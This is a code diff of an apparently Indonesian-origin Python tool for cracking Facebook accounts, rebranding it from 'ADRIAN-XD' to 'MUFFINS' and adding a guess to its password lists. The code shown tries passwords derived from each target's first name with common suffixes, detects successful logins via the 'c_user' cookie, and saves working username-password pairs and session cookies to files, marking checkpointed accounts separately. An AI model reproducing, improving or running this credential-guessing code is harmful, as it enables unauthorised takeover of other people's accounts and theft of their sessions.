@@ -78,19 +78,21 @@ class Main:
 			exit(" ! Your token Expired ! ")
 		os.system("clear")
 		print("""\x1b[1;97m
-   ###    ########  ########  ####    ###    ##    ## 
-  ## ##   ##     ## ##     ##  ##    ## ##   ###   ## 
- ##   ##  ##     ## ##     ##  ##   ##   ##  ####  ## 
-##     ## ##     ## ########   ##  ##     ## ## ## ## 
-######### ##     ## ##   ##    ##  ######### ##  #### 
-##     ## ##     ## ##    ##   ##  ##     ## ##   ### 
-##     ## ########  ##     ## #### ##     ## ##    ## 
+
+███╗   ███╗██╗   ██╗███████╗███████╗██╗███╗   ██╗███████╗
+████╗ ████║██║   ██║██╔════╝██╔════╝██║████╗  ██║██╔════╝
+██╔████╔██║██║   ██║█████╗  █████╗  ██║██╔██╗ ██║███████╗
+██║╚██╔╝██║██║   ██║██╔══╝  ██╔══╝  ██║██║╚██╗██║╚════██║
+██║ ╚═╝ ██║╚██████╔╝██║     ██║     ██║██║ ╚████║███████║
+╚═╝     ╚═╝ ╚═════╝ ╚═╝     ╚═╝     ╚═╝╚═╝  ╚═══╝╚══════╝
+                                                         
  
-[\x1b[1;97m•\33[1;97m] Autor  : ADRIAN-XD \n[\x1b[1;97m•\33[1;97m] Github : ADRIAN-XD\x1b[1;97m\n---------------------------------------------------------------------""")
+ 
+[\x1b[1;97m•\33[1;97m] Autor  : MUFFINS \n[\x1b[1;97m•\33[1;97m] Github : MUFFINS10\x1b[1;97m\n---------------------------------------------------------------------""")
         
 
 		IP = requests.get('https://api.ipify.org').text
-		print('          %s[ %sWelcome To ADRIAN-XD Tool %s%s ]\n'%(N,O,N,O))
+		print('          %s[ %sWelcome To MUFFINS-XD Tool %s%s ]\n'%(N,O,N,O))
 		print('%s[%s•%s] IP     : %s'%(N,O,N,IP))
 		print(f"[•] Name   : {info['name']}  ")
 		print(f"[•] ID     : {info['id']}")
@@ -194,7 +196,7 @@ class Crack:
 				'Accept-Language'	:	'id-ID,id;q=0.9'
 			})
 			if "c_user" in session.cookies.get_dict():
-				print('\r%s[ADRIAN-SUCCESSFULL❤] %s • %s •'%(H,user,pw))
+				print('\r%s[MUFFINS-SUCCESSFULL❤] %s • %s •'%(H,user,pw))
 				ok.append(user+"|"+pw)
 				open("data/ok","a").write(user+"|"+pw+"\n")
 				coki = ';'.join(["%s=%s"%(k,v) for k,v in session.cookies.get_dict().items()])
@@ -203,7 +205,7 @@ class Crack:
 				sys.stdout.flush()
 				break
 			elif "checkpoint" in session.cookies.get_dict():
-				print('\r%s[ADRIAN-CHECKPOINT] %s • %s •'%(M,user,pw))
+				print('\r%s[MUFFINS-CHECKPOINT] %s • %s •'%(M,user,pw))
 				cp.append(user+"|"+pw)
 				open("data/cp","a").write(user+"|"+pw+"\n")
 				h2 = {
@@ -256,16 +258,16 @@ class Assets(Main):
 				namee,id = x.split('><')
 				name = namee.split(" ")
 				if(len(name[0])>=6):
-					__password_list = [namee,name[0]+'123',name[0]+'1234',name[0]+'12345',name[0]+'@123',name[0]+'@1234',name[0]+'@12345',name[0]+'123456',name[0]+'@12',name[0]+'don123',name[0]+'999','12345678@']
+					__password_list = [namee,name[0]+'123',name[0]+'1234',name[0]+'12345',name[0]+'@123',name[0]+'@1234',name[0]+'@12345',name[0]+'123456',name[0]+'@12',name[0]+'don123',name[0]+'999','12345678@',name[0]+'000']
 				elif(len(name[0])<=2):
-					__password_list = [namee,name[0]+'123',name[0]+'1234',name[0]+'12345',name[0]+'@123',name[0]+'@1234',name[0]+'@12345',name[0]+'123456',name[0]+'@12',name[0]+'don123',name[0]+'999','12345678@']
+					__password_list = [namee,name[0]+'123',name[0]+'1234',name[0]+'12345',name[0]+'@123',name[0]+'@1234',name[0]+'@12345',name[0]+'123456',name[0]+'@12',name[0]+'don123',name[0]+'999','12345678@',name[0]+'000']
 				else:
-					__password_list = [namee,name[0]+'123',name[0]+'1234',name[0]+'12345',name[0]+'@123',name[0]+'@1234',name[0]+'@12345',name[0]+'123456',name[0]+'@12',name[0]+'don123',name[0]+'999','12345678@']
+					__password_list = [namee,name[0]+'123',name[0]+'1234',name[0]+'12345',name[0]+'@123',name[0]+'@1234',name[0]+'@12345',name[0]+'123456',name[0]+'@12',name[0]+'don123',name[0]+'999','12345678@',name[0]+'000']
 				if add=="y":
 					__password_list = __password_list + pas
 				kirim.submit(Crack().crack, id, __password_list, self.mbasic)
 		exit(
-			" [program finished] crack finished, ADRIAN-XD"
+			" [program finished] crack finished, MUFFINS-XD"
 		)
 	
 	def dumpAccount(self,**latif_ganteng):
